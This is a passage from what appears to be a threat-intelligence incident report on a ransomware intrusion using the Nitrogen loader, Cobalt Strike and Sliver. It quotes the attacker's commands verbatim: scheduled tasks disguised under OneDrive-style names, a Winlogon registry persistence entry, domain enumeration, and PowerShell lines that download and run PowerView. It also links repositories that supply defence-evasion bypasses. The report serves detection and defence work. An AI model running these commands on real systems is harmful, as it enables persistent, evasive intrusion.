<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38810" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_017.png" alt="" width="1271" height="180" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_017.png 1271w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_017-300x42.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_017-1024x145.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_017-768x109.png 768w" sizes="(max-width: 1271px) 100vw, 1271px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The Sysmon Event ID 10 shows the self-injection technique performed by the Python Cobalt Strike loader.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38772" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_018.png" alt="" width="2000" height="143" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_018.png 2000w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_018-300x21.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_018-1024x73.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_018-768x55.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_018-1536x110.png 1536w" sizes="(max-width: 2000px) 100vw, 2000px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Scheduled Task</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>During the intrusion, the threat actor created multiple scheduled tasks to achieve persistence. This persistence technique was abused on the beachhead host and each host moved to laterally during the first day.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\windows\adfs\py\UpdateEdge.bat /SC ONSTART /F
schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr C:\Users\REDACTED\AppData\Local\Notepad\upedge.bat /SC ONSTART /F
schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\windows\adfs\py\UpdateEdge.bat /SC ONSTART /F
schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\windows\adfs\py\UpdateEdge.bat /SC ONSTART /F
schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\users\REDACTED\appdata\local\notepad\UpdateEdge.bat /SC ONSTART /F
schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\windows\adfs\py\UpdateEdge.bat /sc MINUTE /mo 720 /F
schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr C:\Users\REDACTED\AppData\Local\Notepad\upedge.bat /sc MINUTE /mo 720 /F
schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\windows\adfs\py\UpdateEdge.bat /sc MINUTE /mo 720 /F
schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\users\REDACTED\appdata\local\notepad\UpdateEdge.bat /sc MINUTE /mo 720 /F
schtasks  /create /ru SYSTEM /tn "OneDrive Security Task-S-1-5-21-REDACTED" /tr c:\windows\adfs\py\UpdateEdge.bat /sc MINUTE /mo 720 /F
schtasks /create /I 1 /TR C:\Users\REDACTED\AppData\Local\Notepad\UpdateEG.bat /TN UpdateEdge /SC ONIDLE
</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>However, some of them had mistakes and therefore were not correctly working.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>For example, in the following task, the threat actor didn&#8217;t specify the &#8220;\&#8221; between &#8220;C:&#8221; and the executable name.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">schtasks /create /I 1 /TR C:WindowsTempUpdate.exe /TN UpdateEdge /SC ONIDLE
</pre>
<!-- /wp:preformatted -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38808" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_019.png" alt="" width="1014" height="1125" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_019.png 1014w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_019-270x300.png 270w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_019-923x1024.png 923w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_019-768x852.png 768w" sizes="(max-width: 1014px) 100vw, 1014px" /></a></p>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>While some tasks used the &#8216;ONSTART&#8217; option to enable persistence after reboot, some used a time frame to execute every 720 minutes. For example, on a server the threat actor dropped a BAT file name UpdateEdge.bat and subsequently created two scheduled tasks using this option.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38809" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_020.png" alt="" width="612" height="325" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_020.png 612w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_020-300x159.png 300w" sizes="(max-width: 612px) 100vw, 612px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38807" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_021.png" alt="" width="1062" height="1125" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_021.png 1062w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_021-283x300.png 283w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_021-967x1024.png 967w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_021-768x814.png 768w" sizes="(max-width: 1062px) 100vw, 1062px" /></a></p>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Registry Key</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>To ensure persistence on the beachhead host and three servers, the threat actor added an entry in the Winlogon\Userinit registry key to ensure the execution of UpdateEdge.bat whenever a user logs into the systems.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">cmd.exe /C reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon" /v UserInit /t reg_sz /d "c:\windows\system32\userinit.exe,c:\users\[REDACTED]\appdata\local\notepad\UpdateEdge.bat
</pre>
<!-- /wp:preformatted -->

<!-- wp:image -->
<figure class="wp-block-image"><img decoding="async" src="https://t36032754.p.clickup-attachments.com/t36032754/11f1392a-e647-4b60-ba9b-31502427c8b8/image.png" alt="" /></figure>
<p>&nbsp;</p>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="privilege-escalation" class="wp-block-heading"><a href="#privilege-escalation">Privilege Escalation</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>On the beachhead system, the initial payload setup.exe was executed with High integrity level, which means that the binary was run with the access level equivalent to Administrator access.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38805" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_023.png" alt="" width="954" height="82" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_023.png 954w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_023-300x26.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_023-768x66.png 768w" sizes="(max-width: 954px) 100vw, 954px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>An injected cmd.exe process from the beachhead host opened winlogon.exe with an access mask of 0x143A, which, when decoded, revealed the PROCESS_VM_WRITE permission. The cmd.exe process then executed process injection into winlogon.exe.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38804" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_024.png" alt="" width="1294" height="158" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_024.png 1294w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_024-300x37.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_024-1024x125.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_024-768x94.png 768w" sizes="(max-width: 1294px) 100vw, 1294px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38803" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_025.png" alt="" width="635" height="278" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_025.png 635w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_025-300x131.png 300w" sizes="(max-width: 635px) 100vw, 635px" /></a></p>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>All scheduled tasks created by the threat actor were setup to run in SYSTEM context ensuring that access would stay elevated on hosts.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38771" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_026.png" alt="" width="1156" height="691" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_026.png 1156w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_026-300x179.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_026-1024x612.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_026-768x459.png 768w" sizes="(max-width: 1156px) 100vw, 1156px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Nitrogen</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>By analyzing the modified Python DLL (python311.dll), we notice multiple defense evasion functionalities implemented, such as:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Removing hooks from Windows API functions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Obfuscating the payload in memory (i.e., Sleep Obfuscation).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Bypassing AMSI, WLDP, and ETW.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Based on code overlaps, those techniques could have been copied from the following GitHub repositories:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><a href="https://github.com/NtRaiseHardError/Antimalware-Research/tree/master/Generic/Userland%20Hooking/AntiHook" target="_blank" rel="noreferrer noopener">Antimalware-Research/Generic/Userland Hooking/AntiHook at master · NtRaiseHardError/Antimalware-Research · GitHub</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://github.com/RtlDallas/KrakenMask" target="_blank" rel="noreferrer noopener">GitHub &#8211; RtlDallas/KrakenMask: Sleep obfuscation</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://github.com/TheWover/donut/blob/master/loader/bypass.c" target="_blank" rel="noreferrer noopener">donut/loader/bypass.c at master · TheWover/donut · GitHub</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://gist.github.com/odzhan/9d249047cb89c716c64068c29e5be0b3" target="_blank" rel="noreferrer noopener">Patching WLDP · GitHub</a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38802" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_027.png" alt="" width="1046" height="595" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_027.png 1046w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_027-300x171.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_027-1024x582.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_027-768x437.png 768w" sizes="(max-width: 1046px) 100vw, 1046px" /></a></p>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>An example of code overlap is showed in the following image related to the IsHooked() function.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38801" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_028.png" alt="" width="2000" height="483" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_028.png 2000w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_028-300x72.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_028-1024x247.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_028-768x185.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_028-1536x371.png 1536w" sizes="(max-width: 2000px) 100vw, 2000px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Masquerading</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>With the aim to conceal the malicious activities into normal system events, the threat actor masqueraded both the initial payload and the persistence mechanisms by:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Renaming python.exe to setup.exe.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38770" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_029.png" alt="" width="631" height="482" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_029.png 631w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_029-300x229.png 300w" sizes="(max-width: 631px) 100vw, 631px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Naming the scheduled tasks to mirror OneDrive and Microsoft Edge.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38769" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_030.png" alt="" width="345" height="459" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_030.png 345w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_030-225x300.png 225w" sizes="(max-width: 345px) 100vw, 345px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Renaming python executable used for executing their python stagers for Sliver and Cobalt Strike.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38800" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_031.png" alt="" width="1339" height="116" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_031.png 1339w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_031-300x26.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_031-1024x89.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_031-768x67.png 768w" sizes="(max-width: 1339px) 100vw, 1339px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38799" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_032.png" alt="" width="1546" height="109" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_032.png 1546w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_032-300x21.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_032-1024x72.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_032-768x54.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_032-1536x108.png 1536w" sizes="(max-width: 1546px) 100vw, 1546px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Process injection</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The threat actor was observed injecting into various processes during the intrusion. One specific occasion was during the elevation to SYSTEM on the beachhead host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38798" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_033.png" alt="" width="508" height="277" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_033.png 508w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_033-300x164.png 300w" sizes="(max-width: 508px) 100vw, 508px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Clearing logs</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Execution of the ransomware payload included clearing of various event logs while the hosts were in safe mode.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38797" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_034.png" alt="" width="1398" height="699" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_034.png 1398w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_034-300x150.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_034-1024x512.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_034-768x384.png 768w" sizes="(max-width: 1398px) 100vw, 1398px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Safeboot</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Before executing the final ransomware the threat actor set all hosts to restart in safe mode with networking. This can be used to prevent antivirus or other preventative tools from stopping the ransom execution as many won&#8217;t start when a host is booted in safe mode. It has been <a href="https://attack.mitre.org/techniques/T1562/009/" target="_blank" rel="noreferrer noopener">used</a> by several ransomware families.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38796" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_035.png" alt="" width="1197" height="300" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_035.png 1197w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_035-300x75.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_035-1024x257.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_035-768x192.png 768w" sizes="(max-width: 1197px) 100vw, 1197px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Two hours after initial access, the threat actor utilized Cobalt Strike&#8217;s credential dumping functionalities to access the LSASS process on the beachhead host. This provided them access to a shared local administrator account. Around two hours after that they landed on a server during lateral movement activity, the threat actor was seen accessing LSASS. After this we observed the use of a domain administrator account indicating this second access likely delivered those credentials.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38795" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_036.png" alt="" width="1290" height="262" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_036.png 1290w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_036-300x61.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_036-1024x208.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_036-768x156.png 768w" sizes="(max-width: 1290px) 100vw, 1290px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading"> </h4>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Sliver</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>A few minutes after its execution, Sliver launched the following commands to enumerate:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Local and domain admins.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Domain computers.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Active Directory trusts.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Network adapters.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">net group "domain admins" /domain
ipconfig /all
nltest /domain_trusts
net localgroup administrators
net group "Domain Computers" /domain
</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Cobalt Strike</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>As with Sliver, Cobalt Strike was utilized to perform hands-on keyboard discovery activities.</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">cmd.exe /C net group "Domain controllers" /DOMAIN
cmd.exe /C net group "domain admins" /DOMAIN
cmd.exe /C net localgroup Administrators
cmd.exe /C net group /Domain
cmd.exe /C net group "Domain Computers" /DOMAIN
</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">PowerView</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>On the beachhead host, the threat actor loaded in memory PowerView to perform further discovery activities. This specific action was identified through PowerShell Script Block Logging.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38794" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_037.png" alt="" width="1228" height="1172" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_037.png 1228w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_037-300x286.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_037-1024x977.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_037-768x733.png 768w" sizes="(max-width: 1228px) 100vw, 1228px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>PowerView was used to:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Gather the local admins.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">IEX (New-Object Net.Webclient).DownloadString('http://localhost:33121/'); Invoke-FindLocalAdminAccess -Thread 50
</pre>
<!-- /wp:preformatted -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Extract the servers in the environment.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">IEX (New-Object Net.Webclient).DownloadString('http://localhost:54350/'); Get-DomainComputer -OperatingSystem '*server*' -Properties 'name,operatingsystem,operatingsystemversion,lastlogontimestamp,dnshostname' -Ping &gt;&gt; srv.txt
</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">BloodHound</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The $MFT showed also that in the first phases of the intrusion, the threat actor performed a BloodHound collection to likely identify paths to escalate privileges to domain admin.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38793" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_038.png" alt="" width="996" height="125" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_038.png 996w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_038-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_038-768x96.png 768w" sizes="(max-width: 996px) 100vw, 996px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image --><!-- /wp:image -->

<!-- wp:heading -->
<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Remote Desktop Protocol</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>On the first day of the intrusion, four hours after the Nitrogen execution, the threat actor started interacting with other systems such as a file server through a Cobalt Strike beacon which was injected into winlogon.exe.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38792" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_039.png" alt="" width="1058" height="167" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_039.png 1058w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_039-300x47.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_039-1024x162.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_039-768x121.png 768w" sizes="(max-width: 1058px) 100vw, 1058px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Windows Management Instrumentation (WMI)</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Four hours after initial access, the threat actor moved laterally to a server using Impacket&#8217;s wmiexec and downloaded a ZIP file containing Python and a Cobalt Strike beacon (wo12.py and wo14.py ).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38791" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_040.png" alt="" width="1691" height="367" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_040.png 1691w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_040-300x65.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_040-1024x222.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_040-768x167.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_040-1536x333.png 1536w" sizes="(max-width: 1691px) 100vw, 1691px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38790" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_041.png" alt="" width="2255" height="715" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_041.png 2255w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_041-300x95.png 300w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_041-1024x325.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_041-768x244.png 768w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_041-1536x487.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_041-2048x649.png 2048w" sizes="(max-width: 2255px) 100vw, 2255px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image --><!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Pass the Hash</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>During the intrusion we observed three instances of possible pass-the-hash activity in the logs. These involved instances where the threat actor appear to be moving from the SYSTEM context to a domain administrator account.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/09/25590_042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-38789" src="https://thedfirreport.com/wp-content/uploads/2024/09/25590_042.png" alt="" width="592" height="750" srcset="https://thedfirreport.com/wp-content/uploads/2024/09/25590_042.png 592w, https://thedfirreport.com/wp-content/uploads/2024/09/25590_042-237x300.png 237w" sizes="(max-width: 592px) 100vw, 592px" /></a></p>
